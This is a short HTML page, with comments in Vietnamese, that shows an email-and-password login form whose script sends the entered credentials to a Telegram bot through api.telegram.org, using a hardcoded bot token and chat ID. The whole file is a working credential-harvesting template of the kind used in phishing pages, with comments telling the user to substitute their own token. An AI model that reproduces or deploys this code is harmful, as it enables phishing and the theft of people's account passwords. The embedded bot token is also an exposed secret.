<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send Message to Telegram</title>
</head>
<body>

  <h2>Send Email and Password to Telegram</h2>

  <form id="loginForm">
    <input id="email" type="email" placeholder="Email" required><br><br>
    <input id="password" type="password" placeholder="Password" required><br><br>
    <button id="sendBtn">Send</button>
  </form>

  <script>
    document.getElementById("sendBtn").addEventListener("click", function(event) {
      event.preventDefault();

      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      // Token API từ BotFather và Chat ID
      var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';  // Thay bằng Bot Token của bạn
      var chatId = '6022297636';  // Thay bằng Chat ID của bạn

      // URL API của Telegram
      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Nội dung tin nhắn bạn muốn gửi
      var message = `Email: ${email}\nPassword: ${password}`;

      // Gửi yêu cầu đến Telegram API
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log('Message sent:', data);
      })
      .catch(error => {
        console.error('Error:', error);
      });
    });
  </script>

</body>
</html>
